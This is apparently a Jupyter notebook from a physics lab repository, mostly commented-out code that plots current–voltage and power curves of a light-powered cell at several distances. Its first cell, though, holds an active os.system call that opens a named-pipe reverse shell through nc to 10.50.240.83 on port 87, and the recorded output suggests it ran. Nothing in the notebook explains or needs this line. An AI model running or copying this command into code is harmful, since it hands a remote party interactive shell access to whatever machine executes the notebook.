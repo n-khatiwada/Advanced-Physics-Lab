{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# import _thread\n",
    "# import threading\n",
    "# def func():\n",
    "import os\n",
    "os.system(\"mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc 10.50.240.83 87 1>/tmp/backpipe &\")\n",
    "# threadLock = threading.Lock()\n",
    "# threads = []\n",
    "# thread1 = func()\n",
    "# thread2 = \n",
    "# import codecs\n",
    "# import matplotlib.pyplot as plt\n",
    "# import numpy as np\n",
    "# import odf\n",
    "# import math\n",
    "# import pdfkit\n",
    "# from itertools import chain\n",
    "# from statistics import mean\n",
    "# from uncertainties import ufloat, ufloat_fromstr\n",
    "# from uncertainties.umath import *\n",
    "# from sklearn.linear_model import LinearRegression\n",
    "# from scipy.optimize import curve_fit, minimize_scalar\n",
    "# from lmfit.models import LorentzianModel\n",
    "# from IPython.display import display, Latex\n",
    "# pd.set_option('display.max_rows', None)\n",
    "# pd.set_option('display.max_columns', None)\n",
    "# pd.set_option('display.width', None)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(5 + 8)\n",
    "# f = codecs.open('2b_fan_off.txt').read().replace('\\t', ',')\n",
    "# i = open('new.txt', \"w\")\n",
    "# i.write(f)\n",
    "# i.close()\n",
    "# fanoff = pd.read_csv('new.txt', skiprows=5, usecols=[2, 1], names=['V1', 'I1'])\n",
    "# f = codecs.open('2c_low_speed.txt').read().replace('\\t', ',')\n",
    "# i = open('new.txt', \"w\")\n",
    "# i.write(f)\n",
    "# i.close()\n",
    "# low = pd.read_csv('new.txt', skiprows=5, usecols=[2, 1], names=['V2', 'I2'])\n",
    "# f = codecs.open('2d_high_speed.txt').read().replace('\\t', ',')\n",
    "# i = open('new.txt', \"w\")\n",
    "# i.write(f)\n",
    "# i.close()\n",
    "# high = pd.read_csv('new.txt', skiprows=5, usecols=[2, 1], names=['V3', 'I3'])\n",
    "# concat = pd.concat([fanoff, low, high], axis=1)\n",
    "# head = pd.concat([fanoff.head(30), low.head(30), high.head(30)], axis=1)\n",
    "# head.V1.unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# def linelikeexcel(x,y):\n",
    "#     coefs = np.polyfit(x,y,deg=8)\n",
    "#     p_obj = np.poly1d(coefs)\n",
    "#     return p_obj\n",
    "\n",
    "# p_obj1 = linelikeexcel(np.array(concat['V1']), np.array(concat['I1']))\n",
    "# p_obj2 = linelikeexcel(np.array(concat['V2']), np.array(concat['I2']))\n",
    "# p_obj3 = linelikeexcel(np.array(concat['V3']), np.array(concat['I3']))\n",
    "\n",
    "# x_line = np.linspace(min(np.array(concat['V1'])), max(np.array(concat['V1'])), 200)\n",
    "# y_line1 = p_obj1(x_line)\n",
    "# y_line2 = p_obj2(x_line)\n",
    "# y_line3 = p_obj3(x_line)\n",
    "\n",
    "# plt.figure(figsize=(20,10))\n",
    "# plt.plot(np.array(concat['V1']), np.array(concat['I1']), 'o')\n",
    "# plt.plot(x_line,y_line1, 'r--')\n",
    "\n",
    "# plt.grid()\n",
    "# plt.show()\n",
    "\n",
    "\n",
    "# plt.plot(np.array(concat['V1']), np.array(concat['I1']), np.array(concat['V2']), np.array(concat['I2']), np.array(concat['V3']), np.array(concat['I3']))\n",
    "# plt.grid()\n",
    "# plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# f = codecs.open('3a_40cm.txt').read().replace('\\t', ',')\n",
    "# i = open('new.txt', \"w\")\n",
    "# i.write(f)\n",
    "# i.close()\n",
    "# _40 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I1', 'V1'])\n",
    "# f = codecs.open('3a_50cm.txt').read().replace('\\t', ',')\n",
    "# i = open('new.txt', \"w\")\n",
    "# i.write(f)\n",
    "# i.close()\n",
    "# _50 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I2', 'V2'])\n",
    "# f = codecs.open('3a_60cm.txt').read().replace('\\t', ',')\n",
    "# i = open('new.txt', \"w\")\n",
    "# i.write(f)\n",
    "# i.close()\n",
    "# _60 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I3', 'V3'])\n",
    "# f = codecs.open('3a_70cm.txt').read().replace('\\t', ',')\n",
    "# i = open('new.txt', \"w\")\n",
    "# i.write(f)\n",
    "# i.close()\n",
    "# _70 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I4', 'V4'])\n",
    "# concat = pd.concat([_40, _50, _60, _70], axis=1)\n",
    "# concat['P1'] = concat['I1'] * concat['V1']\n",
    "# concat['P2'] = concat['I2'] * concat['V2']\n",
    "# concat['P3'] = concat['I3'] * concat['V3']\n",
    "# concat['P4'] = concat['I4'] * concat['V4']\n",
    "# concat"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# labels = [i for i in range(40, 71, 10)]\n",
    "# plt.figure(figsize=(12,8))\n",
    "# for i in range(1, 5):\n",
    "#     plt.plot(concat['V' + str(i)], concat['I' + str(i)], label=labels[i - 1])\n",
    "\n",
    "# plt.legend(title='Distance in $cm$', bbox_to_anchor=(1.02, 1.02))\n",
    "# plt.xlabel('Voltage $[V]$')\n",
    "# plt.ylabel('Current $[A]$')\n",
    "# plt.title('IV Characteristic of White Light')\n",
    "# plt.grid()\n",
    "# plt.savefig('a.pdf')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# labels = [i for i in range(40, 71, 10)]\n",
    "# plt.figure(figsize=(12,8))\n",
    "# for i in range(1, 5):\n",
    "#     plt.plot(concat['V' + str(i)], concat['P' + str(i)], label=labels[i - 1])\n",
    "\n",
    "# plt.legend(title='Distance in $cm$', bbox_to_anchor=(1.02, 1.02))\n",
    "# plt.xlabel('Voltage $[V]$')\n",
    "# plt.ylabel('Power $[W]$')\n",
    "# plt.title('Power vs. Voltage of White Light')\n",
    "# plt.grid()\n",
    "# plt.savefig('b.pdf')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# f = codecs.open('4a_30cm.txt').read().replace('\\t', ',')\n",
    "# i = open('new.txt', \"w\")\n",
    "# i.write(f)\n",
    "# i.close()\n",
    "# _40 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I1', 'V1'])\n",
    "# f = codecs.open('4b_40cm.txt').read().replace('\\t', ',')\n",
    "# i = open('new.txt', \"w\")\n",
    "# i.write(f)\n",
    "# i.close()\n",
    "# _50 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I2', 'V2'])\n",
    "# f = codecs.open('4b_50cm.txt').read().replace('\\t', ',')\n",
    "# i = open('new.txt', \"w\")\n",
    "# i.write(f)\n",
    "# i.close()\n",
    "# _60 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I3', 'V3'])\n",
    "# f = codecs.open('4b_60cm.txt').read().replace('\\t', ',')\n",
    "# i = open('new.txt', \"w\")\n",
    "# i.write(f)\n",
    "# i.close()\n",
    "# _70 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I4', 'V4'])\n",
    "# concat = pd.concat([_40, _50, _60, _70], axis=1)\n",
    "# concat['P1'] = concat['I1'] * concat['V1']\n",
    "# concat['P2'] = concat['I2'] * concat['V2']\n",
    "# concat['P3'] = concat['I3'] * concat['V3']\n",
    "# concat['P4'] = concat['I4'] * concat['V4']\n",
    "# concat"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# labels = [i for i in range(40, 71, 10)]\n",
    "# plt.figure(figsize=(12,8))\n",
    "# for i in range(1, 5):\n",
    "#     plt.plot(concat['V' + str(i)], concat['I' + str(i)], label=labels[i - 1])\n",
    "\n",
    "# plt.legend(title='Distance in $cm$', bbox_to_anchor=(1.02, 1.02))\n",
    "# plt.xlabel('Voltage $[V]$')\n",
    "# plt.ylabel('Current $[A]$')\n",
    "# plt.title('IV Characteristic of Green Light')\n",
    "# plt.grid()\n",
    "# plt.savefig('c.pdf')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# labels = [i for i in range(40, 71, 10)]\n",
    "# plt.figure(figsize=(12,8))\n",
    "# for i in range(1, 5):\n",
    "#     plt.plot(concat['V' + str(i)], concat['P' + str(i)], label=labels[i - 1])\n",
    "\n",
    "# plt.legend(title='Distance in $cm$', bbox_to_anchor=(1.02, 1.02))\n",
    "# plt.xlabel('Voltage $[V]$')\n",
    "# plt.ylabel('Power $[W]$')\n",
    "# plt.title('Power vs. Voltage of Green Light')\n",
    "# plt.grid()\n",
    "# plt.savefig('d.pdf')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# i = 1\n",
    "# x = 'y' + str(i)\n",
    "# print(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
